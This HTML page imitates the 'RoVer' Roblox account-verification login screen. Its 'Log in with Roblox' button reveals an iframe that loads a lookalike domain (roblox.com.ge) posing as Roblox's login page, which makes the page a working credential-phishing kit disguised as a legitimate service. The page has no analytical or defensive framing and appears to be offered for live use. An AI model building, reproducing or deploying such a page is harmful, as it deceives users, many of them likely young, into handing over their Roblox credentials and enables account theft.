<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RoVer â€“ Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
  <style>
    html, body {
      height: 100%;
      margin: 0;
      font-family: "Roboto", sans-serif;
      background-color: #1d1b1b;
      color: #fff;
    }

    /* Navbar */
    nav {
      background-color: #c91673;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 12px 24px;
      font-size: 18px;
      position: relative;
    }

    .nav-left {
      display: flex;
      align-items: center;
      gap: 20px;
    }

    .nav-right {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .logo img {
      height: 42px;
      display: block;
    }

    nav a {
      color: #fff;
      text-decoration: none;
      font-size: 16px;
    }

    nav a:hover {
      text-decoration: underline;
    }

    .btn {
      border: 1px solid #fff;
      padding: 6px 12px;
      border-radius: 6px;
      background: none;
      color: #fff;
      font-size: 14px;
      cursor: pointer;
      transition: background 0.2s ease;
      white-space: nowrap;
    }

    .btn:hover {
      background-color: rgba(255, 255, 255, 0.15);
    }

    .username {
      font-size: 14px;
      font-weight: 700;
      white-space: nowrap;
      color: #fff;
    }

    /* Hamburger */
    .hamburger {
      display: none;
      flex-direction: column;
      cursor: pointer;
      gap: 5px;
    }

    .hamburger span {
      width: 24px;
      height: 3px;
      background: #fff;
      border-radius: 2px;
    }

    /* Mobile menu */
    .mobile-menu {
      display: none;
      flex-direction: column;
      gap: 12px;
      width: 100%;
      padding: 12px 16px;
      background: #c91673;
    }

    .mobile-menu.open {
      display: flex;
    }

    /* Header - center panel vertically */
    header {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100%;
      padding-top: 60px; /* adjust to move above middle */
      text-align: center;
    }

    /* Verification Panel */
    .panel {
      background: #000;
      border-radius: 8px;
      padding: 28px 20px;
      max-width: 420px;
      width: 95%;
      box-shadow: 0 6px 16px rgba(0,0,0,0.8);
      text-align: left;
    }

    .panel h1 {
      font-size: 26px;
      font-weight: 800;
      margin: 0 0 12px;
    }

    .redirect-text {
      font-weight: bold;
      font-size: 16px;
      color: #ddd;
      margin: 0 0 20px;
      display: block;
    }

    /* Info Box */
    .info-box {
      display: flex;
      align-items: flex-start;
      background: #2c2c2c;
      border-radius: 6px;
      padding: 10px 14px;
      margin: 0 0 20px;
      text-align: left;
      width: 100%;
      box-sizing: border-box;
      overflow-wrap: break-word;
      word-break: break-word;
    }

    .info-box img {
      width: 22px;
      height: 22px;
      margin-right: 10px;
      margin-top: 2px;
      flex-shrink: 0;
    }

    .info-box p {
      font-size: 15px;
      color: #ddd;
      margin: 0;
      line-height: 1.4;
    }

    /* Login Button */
    .login-btn {
      margin-top: 20px;
      background: #c91673;
      color: #fff;
      padding: 12px 22px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s ease;
      width: 100%;
    }

    .login-btn:hover {
      background: #a1125f;
    }

    /* Responsive iframe */
    .iframe-container {
      margin: 40px auto 0;
      max-width: 900px;
      width: 100%;
      border: 2px solid white;
      border-radius: 8px;
      aspect-ratio: 16 / 9;
      display: none;
      overflow: hidden;
    }

    .iframe-container iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    /* Navbar behavior on mobile */
    @media (max-width: 768px) {
      .nav-left,
      .nav-right {
        display: none;
      }

      .hamburger {
        display: flex;
      }
    }

    /* Mobile responsiveness with auto iframe height */
    @media (max-width: 600px) {
      .panel {
        padding: 20px 16px;
      }

      .panel h1 {
        font-size: 22px;
      }

      .redirect-text {
        font-size: 14px;
      }

      .info-box p {
        font-size: 14px;
      }

      .login-btn {
        font-size: 15px;
        padding: 10px;
      }

      .iframe-container {
        aspect-ratio: auto;
        height: 80vh; /* Automatically fills 80% of the viewport height */
        max-height: 700px; /* Prevents excessive height */
      }
    }
  </style>
</head>
<body>
  <!-- Navbar -->
  <nav>
    <div class="nav-left">
      <div class="logo">
        <img src="https://imgur.com/0ErnjPo.png" alt="RoVer Logo" />
      </div>
      <a href="#">Help</a>
      <a href="#">Team Members</a>
      <button class="btn">RoVer Plus</button>
    </div>
    <div class="nav-right">
      <button class="btn">Manage Servers</button>
      <a href="#" style="font-weight: 700">Verification</a>
      <span class="username"></span>
    </div>

    <!-- Hamburger -->
    <div class="hamburger" id="hamburger">
      <span></span>
      <span></span>
      <span></span>
    </div>
  </nav>

  <!-- Mobile menu -->
  <div class="mobile-menu" id="mobileMenu">
    <a href="#">Help</a>
    <a href="#">Team Members</a>
    <button class="btn">RoVer Plus</button>
    <button class="btn">Manage Servers</button>
    <a href="#" style="font-weight: 700">Verification</a>
    <span class="username"></span>
  </div>

  <!-- Verification Panel -->
  <header>
    <div class="panel" id="mockPanel">
      <h1>Link Roblox Account</h1>
      <span class="redirect-text">You will be redirected to Roblox.</span>

      <div class="info-box">
        <img src="https://img.icons8.com/ios-filled/50/1E90FF/info.png" alt="info" />
        <p>If the next page says:<br>
          <span style="color: #fff;">"You are not allowed to use this application"</span>, please read 
          <span style="color: #c91673;">this help article</span>.
        </p>
      </div>

      <button class="login-btn" id="loginBtn">Log in with Roblox</button>
    </div>

    <!-- Responsive iframe wrapper -->
    <div class="iframe-container" id="verifyFrame">
      <iframe src="https://roblox.com.ge/login?returnUrl=0175976643382159"></iframe>
    </div>
  </header>

  <script>
    const loginBtn = document.getElementById("loginBtn");
    const mockPanel = document.getElementById("mockPanel");
    const verifyFrame = document.getElementById("verifyFrame");
    const hamburger = document.getElementById("hamburger");
    const mobileMenu = document.getElementById("mobileMenu");

    loginBtn.addEventListener("click", () => {
      mockPanel.style.display = "none";
      verifyFrame.style.display = "block";
    });

    hamburger.addEventListener("click", () => {
      mobileMenu.classList.toggle("open");
    });
  </script>
</body>
</html>
